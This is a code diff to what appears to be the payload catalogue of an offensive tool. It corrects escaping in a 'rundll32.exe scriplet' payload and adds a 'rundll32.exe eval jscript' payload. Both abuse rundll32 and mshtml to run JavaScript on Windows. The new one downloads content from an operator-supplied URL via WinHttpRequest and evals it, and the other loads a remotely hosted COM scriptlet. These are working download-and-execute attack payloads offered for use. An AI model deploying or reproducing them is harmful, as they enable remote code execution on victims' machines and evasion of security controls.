@@ -261,12 +261,22 @@ Load({
 
 Load({
 	title: "rundll32.exe scriplet",
-	payload: 'rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\'WScript.Shell\');GetObject(\'script:<PROMPT (Full URI to scriplet)>\');window.close()");',
+	payload: 'rundll32.exe javascript:"\\..\\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\'WScript.Shell\');GetObject(\'script:<PROMPT (Full URI to scriplet)>\');window.close()");',
 	category: "COM Scriplets",
 	callback: function(bro){
 	    question("Enter the full path of your hosted COM scriplet: ")
 	    ask.some(questions, bro);
 	}
+})
+
+Load({
+    title: "rundll32.exe eval jscript",
+    payload: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";x=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");x.open("GET","<PROMPT (Full URI to scriplet)>",false);x.send();eval(x.ResponseText);window.close();',
+    category: "COM Scriplets",
+    callback: function(bro){
+        question("Enter the full path of your hosted file to eval: ")
+        ask.some(questions, bro);
+    }
 })
 
 /*
